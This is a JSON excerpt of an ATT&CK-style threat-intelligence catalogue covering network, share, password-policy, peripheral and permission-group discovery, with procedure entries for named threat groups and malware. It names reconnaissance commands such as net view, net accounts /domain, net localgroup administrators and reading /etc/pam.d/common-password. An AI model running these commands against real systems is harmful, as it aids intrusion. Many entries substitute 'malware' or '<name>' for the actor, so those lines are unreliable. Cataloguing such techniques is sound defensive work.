                "Description": "malware has used the SNScan tool to find other potential targets on victim networks.[12]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware can conduct port scanning against targeted systems.[13]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors used the SoftPerfect Network Scanner for network scanning.[14]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, used RustScan to scan for open ports on targeted ESXi appliances.[15]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware has a module to use a port scanner on a system.[16]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used the get -b  -e  -p command for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP.[17]"
            },
            "S0020": {
                "ID": "S0020",
                "Name": "China Chopper",
                "Description": "malware's server component can spider authentication portals.[18]"
            },
            "G0080": {
                "ID": "G0080",
                "Name": "Cobalt Group",
                "Description": "malware leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.[19][20][21]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can perform port scans from an infected host.[22][23][24]"
            },
            "S0608": {
                "ID": "S0608",
                "Name": "Conficker",
                "Description": "malware scans for other machines to infect.[25]"
            },
            "C0004": {
                "ID": "C0004",
                "Name": "CostaRicto",
                "Description": "During malware, the threat actors employed nmap and pscan to scan target environments.[26]"
            },
            "G0105": {
                "ID": "G0105",
                "Name": "DarkVishnya",
                "Description": "malware performed port scanning to obtain the list of active services.[27]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can perform port scans from an infected host.[28]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has utilized nmap for reconnaissance efforts. malware has also scanned for internal MS-SQL servers in a compromised network.[29][30]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[31]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has used tools including NMAP to conduct broad scanning to identify open ports.[32][33]"
            },
            "S0061": {
                "ID": "S0061",
                "Name": "HDoor",
                "Description": "malware scans to identify open ports on the victim.[34]"
            },
            "S0698": {
                "ID": "S0698",
                "Name": "HermeticWizard",
                "Description": "malware has the ability to scan ports on a compromised network.[35]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has used masscan to look for kubelets in the internal Kubernetes network.[36]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware uses a custom port scanner to map out a network.[37]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can scan the network for open ports and vulnerable instances of RDP and SMB protocols.[38]"
            },
            "S0250": {
                "ID": "S0250",
                "Name": "Koadic",
                "Description": "malware can scan for open TCP ports on the target network.[39]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network.[40]"
            },
            "G0077": {
                "ID": "G0077",
                "Name": "Leafminer",
                "Description": "malware scanned network services to search for vulnerabilities in the victim system.[41]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can scan for open ports including TCP ports 135 and 1433.[42]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used KPortScan 3.0 to perform SMB, RDP, and LDAP scanning.[43]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used tcping.exe, similar to Ping, to probe port status on systems of interest.[44]"
            },
            "S0233": {
                "ID": "S0233",
                "Name": "MURKYTOP",
                "Description": "malware has the capability to scan for open ports on hosts in a connected network.[18]"
            },
            "G0019": {
                "ID": "G0019",
                "Name": "Naikon",
                "Description": "malware has used the LadonGo scanner to scan target networks.[45]"
            },
            "S0590": {
                "ID": "S0590",
                "Name": "NBTscan",
                "Description": "malware can be used to scan IP networks.[46][47]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.[48]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors scanned for open ports and used nbtscan to find NETBIOS nameservers.[49]"
            },
            "S0598": {
                "ID": "S0598",
                "Name": "P.A.S. Webshell",
                "Description": "malware can scan networks for open ports and listening services.[50]"
            },
            "S0683": {
                "ID": "S0683",
                "Name": "Peirates",
                "Description": "malware can initiate a port scan against a given IP address.[51]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware can perform port scans from an infected host.[52]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware has a built-in module for port scanning.[53]"
            },
            "S0583": {
                "ID": "S0583",
                "Name": "Pysa",
                "Description": "malware can perform network reconnaissance using the Advanced Port Scanner tool.[54]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can scan for systems that are vulnerable to the EternalBlue exploit.[55][56]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware has a plugin that can perform ARP scanning as well as port scanning.[57]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware conducted scanning for exposed TCP port 7001 as well as SSH and Redis servers.[58][59]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware can scan the network interfaces of targeted systems.[60]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can scan for open ports on a compromised machine.[61]"
            },
            "S0374": {
                "ID": "S0374",
                "Name": "SpeakUp",
                "Description": "malware checks for availability of specific ports on servers.[62]"
            },
            "G0039": {
                "ID": "G0039",
                "Name": "Suckfly",
                "Description": "malware the victim's internal network for hosts with ports 8080, 5900, and 40 open.[63]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has used masscan to search for open Docker API ports and Kubernetes clusters.[64][36][65] malware has also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments.[66]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware actors use the Hunter tool to conduct network service discovery for vulnerable systems.[67][68]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware used pr and an openly available tool to scan for open ports on target systems.[69][70]"
            },
            "S0341": {
                "ID": "S0341",
                "Name": "Xbash",
                "Description": "malware can perform port scanning of TCP and UDP ports.[71]"
            },
            "S0117": {
                "ID": "S0117",
                "Name": "XTunnel",
                "Description": "malware is capable of probing the network for open ports.[72]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can launch port scans.[7][73]"
            }
        }
    },
    "T1135": {
        "ttp_name": "Network Share Discovery",
        "ttp_id": "T1135",
        "href": "/techniques/T1135",
        "tactic": "Discovery",
        "description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. File sharing over a Windows network occurs over the SMB protocol. [1] [2] Net can be used to query a remote system for available shared drives using the net view \\\\remotesystem command. It can also be used to query shared drives on the local system using net share. For macOS, the sharing -l command lists all shared points used for smb services.",
        "Procedure": {
            "S1129": {
                "ID": "S1129",
                "Name": "Akira",
                "Description": "malware can identify remote file shares for encryption.[3]"
            },
            "G0006": {
                "ID": "G0006",
                "Name": "APT1",
                "Description": "malware listed connected network shares.[4]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware used the net view command to show all shares available, including the administrative shares such as C$ and ADMIN$.[5]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has enumerated network shares on a compromised host.[6]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used the post exploitation tool CrackMapExec to enumerate network shares.[7]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used the net share command as part of network reconnaissance.[8][9]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware has enumerated shared folders and mapped volumes.[10]"
            },
            "S1053": {
                "ID": "S1053",
                "Name": "AvosLocker",
                "Description": "malware has enumerated shared drives on a compromised network.[11][12]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware has the ability to enumerate network shares.[13]"
            },
            "S0606": {
                "ID": "S0606",
                "Name": "Bad Rabbit",
                "Description": "malware enumerates open SMB shares on internal victim networks.[14]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can check a user's access to the C$ share on a compromised machine.[15]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can enumerate shared drives on the domain.[16]"
            },
            "S0570": {
                "ID": "S0570",
                "Name": "BitPaymer",
                "Description": "malware can search for network shares on the domain or workgroup using net view .[17]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware has the ability to discover network shares on compromised networks.[18][19]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors executed the PowerView ShareFinder module to identify open shares.[20]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used net share and net view to identify network shares of interest.[21]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware has the ability to enumerate network shares.[22]"
            },
            "S0611": {
                "ID": "S0611",
                "Name": "Clop",
                "Description": "malware can enumerate network shares.[23]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can query shared drives on the local system.[24]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware can enumerate remote open SMB network shares using NetShareEnum().[25][26]"
            },
            "S0488": {
                "ID": "S0488",
                "Name": "CrackMapExec",
                "Description": "malware can enumerate the shared folders and associated permissions for a targeted network.[27]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware can discover shared resources using the NetShareEnum API call.[28]"
            },
            "G0105": {
                "ID": "G0105",
                "Name": "DarkVishnya",
                "Description": "malware scanned the network for public shared folders.[29]"
            },
            "S0616": {
                "ID": "S0616",
                "Name": "DEATHRANSOM",
                "Description": "malware has the ability to use loop operations to enumerate network resources.[30]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware has a ENMDSKS command to enumerates available network shares.[31]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.[32]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has enumerated non-hidden network shares using WNetEnumResourceW. [33]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can find shared drives on the local system.[34]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has executed net view commands for enumeration of open shares on compromised machines.[35][36]"
            },
            "S0618": {
                "ID": "S0618",
                "Name": "FIVEHANDS",
                "Description": "malware can enumerate network shares and mounted drives on a network.[37]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware has been used to execute net view to discover mapped network shares.[38]"
            },
            "S0617": {
                "ID": "S0617",
                "Name": "HELLOKITTY",
                "Description": "malware has the ability to enumerate network resources.[30]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can gather network share information.[39]"
            },
            "S0250": {
                "ID": "S0250",
                "Name": "Koadic",
                "Description": "malware can scan local network for open SMB.[40]"
            },
            "S1075": {
                "ID": "S1075",
                "Name": "KOPILUWAK",
                "Description": "malware can use netstat and Net to discover network shares.[41]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware collects a list of network shares with the command net share.[42]"
            },
            "S0233": {
                "ID": "S0233",
                "Name": "MURKYTOP",
                "Description": "malware has the capability to retrieve information about shares on remote hosts.[43]"
            },
            "S0039": {
                "ID": "S0039",
                "Name": "Net",
                "Description": "The net view \\remotesystem and net share commands in malware can be used to find shared drives and directories on remote and local systems respectively.[44]"
            },
            "S0365": {
                "ID": "S0365",
                "Name": "Olympic Destroyer",
                "Description": "malware will attempt to enumerate mapped network shares to later attempt to wipe all files on those shares.[45]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used the net share command as part of their advanced reconnaissance.[46]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors discovered network disks mounted to the system using netstat.[47]"
            },
            "S0165": {
                "ID": "S0165",
                "Name": "OSInfo",
                "Description": "malware discovers shares on the network[48]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware has a module to enumerate network shares.[49]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can list local and remote shared drives and folders over SMB.[50]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can use net share to identify network shares for use in lateral movement.[51][52]"
            },
            "S0686": {
                "ID": "S0686",
                "Name": "QuietSieve",
                "Description": "malware can identify and search networked drives for specific file name extensions.[53]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can scan for network drives which may contain documents for collection.[54][55]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware can enumerate the shared resources of a given IP addresses using the API call NetShareEnum.[56]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to execute the net view command.[57]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware can enumerate connected drives for infected host machines.[58]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can enumerate shares on a compromised host.[59]"
            },
            "G0054": {
                "ID": "G0054",
                "Name": "Sowbug",
                "Description": "malware listed remote shared drives that were accessible from a victim.[60]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware enumerates the directories of a network resource.[61]"
            },
            "G0131": {
                "ID": "G0131",
                "Name": "Tonto Team",
                "Description": "malware has used tools such as NBTscan to enumerate network shares.[62]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware module shareDll/mshareDll discovers network shares via the WNetOpenEnumA API.[63][64]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware used netview to scan target systems for shared resources.[65]"
            },
            "S0612": {
                "ID": "S0612",
                "Name": "WastedLocker",
                "Description": "malware can identify network adjacent and accessible drives.[66]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware can enumerate connected remote logical drives.[67]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used the \"net view\" command to locate mapped network shares.[68]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware identifies network drives when they are added to victim systems.[69]"
            }
        }
    },
    "T1201": {
        "ttp_name": "Password Policy Discovery",
        "ttp_id": "T1201",
        "href": "/techniques/T1201",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l , cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies [1] [2]. Adversaries may also leverage a Network Device CLI on network devices to discover password policy information (e.g. show aaa, show aaa common-criteria policy all).[3]Password policies can be discovered in cloud environments using available APIs such as GetAccountPasswordPolicy in AWS [4].",
        "Procedure": {
            "S0521": {
                "ID": "S0521",
                "Name": "BloodHound",
                "Description": "malware can collect password policy information on the target environment.[5]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used the NtdsAudit utility to collect information related to accounts and passwords.[6]"
            },
            "S0488": {
                "ID": "S0488",
                "Name": "CrackMapExec",
                "Description": "malware can discover the password policies applied to the target system.[7]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware collects password policy information with the command net accounts.[8]"
            },
            "S0039": {
                "ID": "S0039",
                "Name": "Net",
                "Description": "The net accounts and net accounts /domain commands with malware can be used to obtain password policy information.[9]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used net.exe in a script with net accounts /domain to find the password policy of a domain.[10]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used the net accounts command as part of their advanced reconnaissance.[11]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware can use Get-PassPol to enumerate the domain password policy.[12]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware has used net accounts and net accounts /domain to acquire password policy information.[13]"
            }
        }
    },
    "T1120": {
        "ttp_name": "Peripheral Device Discovery",
        "ttp_id": "T1120",
        "href": "/techniques/T1120",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.[1][2] Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
        "Procedure": {
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "malware can list connected devices.[3]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware uses a module to receive a notification every time a USB mass storage device is inserted into a victim.[4]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices. [5]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware has a plugin that collects information about inserted storage devices, modems, and phone devices.[6]"
            },
            "G0135": {
                "ID": "G0135",
                "Name": "BackdoorDiplomacy",
                "Description": "malware has used an executable to detect removable media, such as USB flash drives.[7]"
            },
            "S0128": {
                "ID": "S0128",
                "Name": "BADNEWS",
                "Description": "malware checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.[8][9]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware can detect USB devices.[10]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware can gather very specific information about attached USB devices, to include device instance ID and drive geometry.[11]"
            },
            "S0454": {
                "ID": "S0454",
                "Name": "Cadelspy",
                "Description": "malware has the ability to steal information about printers and the documents sent to printers.[12]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware has the ability to discover pluggable/removable drives to extract files from.[13][14]"
            },
            "S0538": {
                "ID": "S0538",
                "Name": "Crutch",
                "Description": "malware can monitor for removable drives being plugged into the compromised machine.[15]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can list signed PnP drivers for smartcard readers.[16]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "malware can detect connected USB devices.[17]"
            },
            "G0020": {
                "ID": "G0020",
                "Name": "Equation",
                "Description": "malware has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.[18]"
            },
            "S0679": {
                "ID": "S0679",
                "Name": "Ferocious",
                "Description": "malware can run GET.WORKSPACE in Microsoft Excel to check if a mouse is present.[19]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware will attempt to detect if a usable smart card is current inserted into a card reader.[20]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "The malware FilepakMonitor component can detect removable drive insertion.[21]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware tools have contained an application to check performance of USB flash drives. malware has also used malware to scan for removable drives.[22][23]"
            },
            "S1027": {
                "ID": "S1027",
                "Name": "Heyoka Backdoor",
                "Description": "malware can identify removable media attached to victim's machines.[24]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can map UPnP ports.[25]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware detects the insertion of new devices by listening for the WM_DEVICECHANGE window message.[26]"
            },
            "S1026": {
                "ID": "S1026",
                "Name": "Mongall",
                "Description": "malware can identify removable media attached to compromised hosts.[24]"
            },
            "S0149": {
                "ID": "S0149",
                "Name": "MoonWind",
                "Description": "malware obtains the number of removable drives from the victim.[27]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware has the ability to monitor removable drives.[28]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware will attempt to detect if the victim system has a camera during the initial infection. malware can also detect any removable drives connected to the system.[29][30]"
            },
            "S0644": {
                "ID": "S0644",
                "Name": "ObliqueRAT",
                "Description": "malware can discover pluggable/removable drives to extract files from.[31]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used tools to identify if a mouse is connected to a targeted system.[32]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used the fsutil fsinfo drives command as part of their advanced reconnaissance.[33]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors discovered removable disks attached to a system.[34]"
            },
            "S0113": {
                "ID": "S0113",
                "Name": "Prikormka",
                "Description": "A module in malware collects information on available printers and disk drives.[35]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can identify peripheral devices on targeted systems.[36]"
            },
            "S0686": {
                "ID": "S0686",
                "Name": "QuietSieve",
                "Description": "malware can identify and search removable drives for specific file name extensions.[37]"
            },
            "S0481": {
                "ID": "S0481",
                "Name": "Ragnar Locker",
                "Description": "malware may attempt to connect to removable drives and mapped network drives.[38]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can scan for removable media which may contain documents for collection.[39][40]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can obtain a list of smart card readers attached to the victim.[41][42]"
            },
            "S1089": {
                "ID": "S1089",
                "Name": "SharpDisco",
                "Description": "malware has dropped a plugin to monitor external drives to C:\\Users\\Public\\It3.exe.[28]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware enumerates removable drives for infection.[43]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can check for the number of devices plugged into an infected host.[44]"
            },
            "S0098": {
                "ID": "S0098",
                "Name": "T9000",
                "Description": "malware searches through connected drives for removable storage devices.[45]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to identify connected Apple devices.[46]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has searched for attached VGA devices using lspci.[47]"
            },
            "S0647": {
                "ID": "S0647",
                "Name": "Turian",
                "Description": "malware can scan for removable media to collect data.[7]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware has used fsutil fsinfo drives to list connected drives.[48]"
            },
            "S0452": {
                "ID": "S0452",
                "Name": "USBferry",
                "Description": "malware can check for connected USB devices.[49]"
            },
            "S0136": {
                "ID": "S0136",
                "Name": "USBStealer",
                "Description": "malware monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.[50]"
            },
            "S0366": {
                "ID": "S0366",
                "Name": "WannaCry",
                "Description": "malware contains a thread that will attempt to scan for new attached drives every few seconds. If one is identified, it will encrypt the files on the attached device.[51]"
            },
            "S0612": {
                "ID": "S0612",
                "Name": "WastedLocker",
                "Description": "malware can enumerate removable drives prior to the encryption process.[52]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware enumerates information about connected storage devices.[53]"
            }
        }
    },
    "T1069": {
        "ttp_name": "Permission Groups Discovery",
        "ttp_id": "T1069",
        "href": "/techniques/T1069",
        "subtechnique": {
            "001": {
                "name": "Local Groups",
                "href": "/techniques/T1069/001",
                "description": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.Commands such as net localgroup of the Net utility, dscl . -list /Groups on macOS, and groups on Linux can list local groups.",
                "Procedure": {
                    "G0018": {
                        "ID": "G0018",
                        "Name": "admin@338",
                        "Description": "<name> actors used the following command following exploitation of a machine with LOWBALL malware to list local groups: net localgroup administrator >> %temp%\\download[1]"
                    },
                    "S0521": {
                        "ID": "S0521",
                        "Name": "BloodHound",
                        "Description": "<name> can collect information about local groups and members.[2]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors used the command net localgroup \"adminstrator\" to identify accounts with local administrator rights.[3]"
                    },
                    "S0572": {
                        "ID": "S0572",
                        "Name": "Caterpillar WebShell",
                        "Description": "<name> can obtain a list of local groups of users from a system.[4]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used net localgroup administrators to identify  accounts with local administrative rights.[5]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use net localgroup to list local groups on a system.[6]"
                    },
                    "S0082": {
                        "ID": "S0082",
                        "Name": "Emissary",
                        "Description": "<name> has the capability to execute the command net localgroup administrators.[7]"
                    },
                    "S0091": {
                        "ID": "S0091",
                        "Name": "Epic",
                        "Description": "<name> gathers information on local group names.[8]"
                    },
                    "S0696": {
                        "ID": "S0696",
                        "Name": "Flagpro",
                        "Description": "<name> has been used to execute the net localgroup administrators command on a targeted system.[9]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> enumerates the privilege level of the victim during the initial infection.[10][11]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> has checked the local administrators group.[12]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has run net localgroup to enumerate local groups.[13]"
                    },
                    "S0201": {
                        "ID": "S0201",
                        "Name": "JPIN",
                        "Description": "<name> can obtain the permissions of the victim user.[14]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> gathers information about local groups and members.[15]"
                    },
                    "S0236": {
                        "ID": "S0236",
                        "Name": "Kwampirs",
                        "Description": "<name> collects a list of users belonging to the local users and administrators groups with the commands net localgroup administrators and net localgroup users.[16]"
                    },
                    "S0039": {
                        "ID": "S0039",
                        "Name": "Net",
                        "Description": "Commands such as net group and net localgroup can be used in <name> to gather information about and manipulate groups.[17]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used net localgroup administrators to find local administrators on compromised systems.[18]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors used the net group command as part of their advanced reconnaissance.[19]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used the command net localgroup administrators to list all administrators part of a local group.[20]"
                    },
                    "S0165": {
                        "ID": "S0165",
                        "Name": "OSInfo",
                        "Description": "<name> has enumerated the local administrators group.[21]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> contains modules, such as Get-LocAdm for enumerating permission groups.[22]"
                    },
                    "S0184": {
                        "ID": "S0184",
                        "Name": "POWRUNER",
                        "Description": "<name> may collect local group information by running net localgroup administrators or a series of other commands on a victim.[23]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use net localgroup to enable discovery of local groups.[24][25]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can obtain a list of local groups and members.[26]"
                    },
                    "S0060": {
                        "ID": "S0060",
                        "Name": "Sys10",
                        "Description": "<name> collects the group name of the logged-in user and sends it to the C2.[27]"
                    },
                    "G0131": {
                        "ID": "G0131",
                        "Name": "Tonto Team",
                        "Description": "<name> has used the ShowLocalGroupDetails command to identify administrator, user, and guest accounts on a compromised host.[28]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used net localgroup and net localgroup Administrators to enumerate group information, including members of the local administrators group.[29]"
                    },
                    "G1017": {
                        "ID": "G1017",
